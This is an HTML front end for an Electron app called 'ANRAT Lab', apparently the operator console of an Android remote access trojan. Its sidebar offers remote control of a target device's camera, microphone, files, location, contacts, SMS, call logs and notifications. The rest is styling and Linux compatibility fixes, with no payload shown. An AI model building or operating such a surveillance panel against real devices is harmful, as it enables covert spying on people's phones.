<!DOCTYPE html>
<html ng-app="myappy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANRAT Lab</title>
    
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
        (function() {
    const { remote } = require('electron');
    const os = require('os');
    
    // Detect platform
    const platform = os.platform();
    
    // Add platform class to body
    if (platform === 'linux') {
        document.body.classList.add('linux');
        console.log('Linux detected - Applied compatibility fixes');
    } else if (platform === 'win32') {
        document.body.classList.add('windows');
    } else if (platform === 'darwin') {
        document.body.classList.add('macos');
    }
    
    // Linux specific fixes
    if (platform === 'linux') {
        // Fix for window dragging in Linux
        const titlebar = document.querySelector('.titlebar');
        if (titlebar && !remote.getCurrentWindow().isFrameless()) {
            titlebar.style.display = 'none';
            
            // Adjust main container
            const mainContainer = document.querySelector('.main-container');
            if (mainContainer) {
                mainContainer.style.height = '100vh';
            }
        }
        
        // Disable GPU acceleration if laggy (uncomment if needed)
        // remote.app.disableHardwareAcceleration();
        
        // Fix for font rendering
        document.documentElement.style.setProperty('-webkit-font-smoothing', 'antialiased');
        document.documentElement.style.setProperty('-moz-osx-font-smoothing', 'grayscale');
        
        // Fix for transparency issues
        document.body.style.backgroundColor = '#0c094f';
        
        // Listen for window state changes
        const currentWindow = remote.getCurrentWindow();
        
        currentWindow.on('maximize', () => {
            console.log('Window maximized');
        });
        
        currentWindow.on('unmaximize', () => {
            console.log('Window unmaximized');
        });
        
        // Performance optimization for Linux
        requestAnimationFrame(() => {
            console.log('Linux compatibility mode enabled');
        });
    }
    
    // Log platform info
    console.log('Platform:', platform);
    console.log('Architecture:', os.arch());
    console.log('Release:', os.release());
})();
    </script>

    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
    <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
    <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
    <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>

    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <link rel="stylesheet" href="assets/css/leaflet.css" />
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f7fa;
            overflow: hidden;
        }

        /* Titlebar */
        .titlebar {
            height: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            -webkit-app-region: drag;
            color: white;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .titlebar-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .titlebar-left img {
            width: 30px;
            height: 30px;
            border-radius: 6px;
        }

        .titlebar-info h2 {
            font-size: 16px;
            font-weight: 600;
            margin: 0;
        }

        .titlebar-info p {
            font-size: 12px;
            opacity: 0.9;
            margin: 0;
        }

        .titlebar-controls {
            display: flex;
            gap: 10px;
            -webkit-app-region: no-drag;
        }

        .titlebar-button {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .titlebar-button:hover {
            opacity: 0.8;
        }

        .btn-maximize { background: #10b981; }
        .btn-close { background: #ef4444; }

        /* Main Container */
        .main-container {
            display: flex;
            height: calc(100vh - 200px);
        }

        /* Sidebar */
        .sidebar {
            width: 260px;
            background: #1a202c;
            color: white;
            display: flex;
            flex-direction: column;
            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
        }

        .sidebar-header {
            padding: 20px;
            background: rgba(0,0,0,0.2);
        }

        .sidebar-header h3 {
            font-size: 14px;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin: 0;
        }

        .sidebar-menu {
            flex: 1;
            padding: 10px 0;
            overflow-y: auto;
        }

        .menu-item {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            color: #d1d5db;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            border-left: 3px solid transparent;
        }

        .menu-item:hover {
            background: rgba(96, 165, 250, 0.1);
            color: #60a5fa;
        }

        .menu-item.active {
            background: rgba(96, 165, 250, 0.15);
            color: #60a5fa;
            border-left-color: #60a5fa;
        }

        .menu-item i {
            width: 24px;
            margin-right: 12px;
            font-size: 18px;
        }

        .menu-item span {
            font-size: 14px;
            font-weight: 500;
        }

        .menu-item.red i { color: #ef4444; }
        .menu-item.teal i { color: #14b8a6; }
        .menu-item.blue i { color: #3b82f6; }
        .menu-item.violet i { color: #8b5cf6; }
        .menu-item.purple i { color: #a855f7; }
        .menu-item.grey i { color: #6b7280; }
        .menu-item.black i { color: #374151; }

        /* Content Area */
        .content-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            background: #f5f7fa;
            padding: 30px;
        }

        /* Logs */
        .logs-footer {
            background: #1f2937;
            color: #d1d5db;
            padding: 15px 20px;
            height: 150px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            border-top: 1px solid #374151;
        }

        .log-entry {
            margin-bottom: 6px;
            display: flex;
            gap: 10px;
        }

        .log-time {
            color: #6b7280;
            min-width: 150px;
        }

        .log-message {
            flex: 1;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #f1f1f1;
        }

        ::-webkit-scrollbar-thumb {
            background: #cbd5e0;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #a0aec0;
        }

        /* Map Container */
        #mapid {
            height: 500px;
            border-radius: 8px;
            margin-top: 20px;
        }
        /* Linux Compatibility Fixes - Tambahkan di bagian <style> */

/* Detect Linux */
body.linux {
    /* Fix font rendering */
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

/* Linux: Hide custom titlebar if using native frame */
body.linux .titlebar {
    display: none;
}

/* Linux: Adjust main container height */
body.linux .main-container {
    height: 100vh;
}

/* Linux: Fix draggable regions */
.draggable {
    -webkit-app-region: drag;
}

.notDraggable,
button,
input,
select,
textarea,
a {
    -webkit-app-region: no-drag !important;
}

/* Linux: Fix scrollbar rendering */
::-webkit-scrollbar {
    width: 10px;
    height: 10px;
}

::-webkit-scrollbar-track {
    background: #f1f1f1;
    border-radius: 5px;
}

::-webkit-scrollbar-thumb {
    background: #888;
    border-radius: 5px;
}

::-webkit-scrollbar-thumb:hover {
    background: #555;
}

/* Linux: Fix transparency issues */
body.linux {
    background: #0c094f !important;
}

body.linux .sidebar {
    background: #1a202c !important;
}

/* Linux: Better button rendering */
button {
    cursor: pointer;
    outline: none;
    border: none;
}

button:focus {
    outline: 2px solid #3b82f6;
    outline-offset: 2px;
}

/* Linux: Fix select dropdown */
select {
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    background-image: url('data:image/svg+xml;utf8,<svg fill="%23333" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
    background-repeat: no-repeat;
    background-position: right 8px center;
    padding-right: 30px;
}

/* Linux: Fix input rendering */
input,
textarea {
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
}

/* Linux: Fix table rendering */
table {
    border-collapse: collapse;
    width: 100%;
}

/* Linux: Better shadow rendering */
.card,
.sidebar {
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) !important;
}

/* Linux: Fix for modal/overlay issues */
.ui.modal,
.ui.dimmer {
    z-index: 9999 !important;
}

/* Linux: Fix icon rendering */
i.icon {
    display: inline-block;
    font-style: normal;
    line-height: 1;
}

/* Linux: Fix gradient rendering */
@supports (-webkit-appearance: none) {
    .gradient-bg {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important;
    }
}

/* Linux: Fix overflow issues */
body.linux * {
    box-sizing: border-box;
}

/* Linux: Performance optimization */
body.linux * {
    will-change: auto;
}

body.linux .animated {
    will-change: transform, opacity;
}

/* Linux: Fix flex layout issues */
.flex-container {
    display: flex !important;
}

/* Khusus untuk Ubuntu/Debian yang menggunakan GTK theme */
@media (prefers-color-scheme: dark) {
    body.linux {
        color-scheme: dark;
    }
}

/* Fix untuk resolusi tinggi di Linux */
@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
    body.linux {
        zoom: 1;
    }
}
    </style>
</head>

<body ng-controller="LabCtrl">
    <!-- Titlebar -->
    <div class="titlebar">
        <div class="titlebar-left">
            <img src="assets/img/icon.png" alt="ANRAT">
            <div class="titlebar-info">
                <h2>Target Lab Control</h2>
                <p>Remote Device Management</p>
            </div>
        </div>
        <div class="titlebar-controls">
            <div class="titlebar-button btn-maximize" ng-click="maximize()"></div>
            <div class="titlebar-button btn-close" ng-click="close()"></div>
        </div>
    </div>

    <!-- Main Container -->
    <div class="main-container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-header">
                <h3>Remote Control</h3>
            </div>

            <div class="sidebar-menu">
                <a class="menu-item red" ng-click="goToPage('camera')" ng-class="{'active': currentPage === 'camera'}">
                    <i class="camera icon"></i>
                    <span>Camera</span>
                </a>
                <a class="menu-item teal" ng-click="goToPage('fileManager')" ng-class="{'active': currentPage === 'fileManager'}">
                    <i class="folder open icon"></i>
                    <span>File Manager</span>
                </a>
                <a class="menu-item blue" ng-click="goToPage('mic')" ng-class="{'active': currentPage === 'mic'}">
                    <i class="microphone icon"></i>
                    <span>Microphone</span>
                </a>
                <a class="menu-item violet" ng-click="goToPage('location')" ng-class="{'active': currentPage === 'location'}">
                    <i class="map marker alternate icon"></i>
                    <span>Location</span>
                </a>
                <a class="menu-item purple" ng-click="goToPage('contacts')" ng-class="{'active': currentPage === 'contacts'}">
                    <i class="users icon"></i>
                    <span>Contacts</span>
                </a>
                <a class="menu-item grey" ng-click="goToPage('smsManager')" ng-class="{'active': currentPage === 'smsManager'}">
                    <i class="comment alternate icon"></i>
                    <span>SMS Manager</span>
                </a>
                <a class="menu-item black" ng-click="goToPage('callsLogs')" ng-class="{'active': currentPage === 'callsLogs'}">
                    <i class="phone icon"></i>
                    <span>Call Logs</span>
                </a>
                <a class="menu-item black" ng-click="goToPage('notifications')" ng-class="{'active': currentPage === 'notifications'}">  <!-- TAMBAHKAN INI -->
                    <i class="bell outline icon"></i>
                    <span>Notification</span>
                </a>
            </div>
        </div>

        <!-- Content Area - LANGSUNG ng-view tanpa wrapper -->
        <div class="content-area" ng-view></div>
    </div>

    <!-- Logs Footer - ID harus "logy" untuk LabCtrl -->
    <div class="logs-footer" id="logy">
        <div class="log-entry" ng-repeat="log in logs">
            <span class="log-time">{{log.date}}</span>
            <span class="log-message" ng-style="{'color': log.color}">{{log.msg}}</span>
        </div>
    </div>
</body>
</html>